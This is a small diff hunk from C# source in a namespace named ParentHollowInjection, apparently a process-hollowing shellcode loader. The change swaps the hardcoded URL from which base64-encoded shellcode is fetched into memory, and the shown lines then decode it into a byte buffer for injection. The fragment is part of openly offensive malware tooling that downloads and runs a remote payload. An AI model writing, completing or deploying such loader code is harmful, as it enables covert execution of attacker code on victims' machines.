@@ -539,7 +539,7 @@ namespace ParentHollowInjection
                 // OR hardcode the URL to remotely download the base64 encoded shellcode in memory
                 byte[] buf = new byte[] { };
                 string shellcode = "<PLACEHOLDER>";
-                string urlToSC = @"http://10.111.10.5/sharp.b64";
+                string urlToSC = @"http://192.168.1.10/payload.b64";
                 shellcode = GetCode(urlToSC);  //if NOT downloading the shellcode, command this line out. 
                 buf = Convert.FromBase64String(shellcode);
 
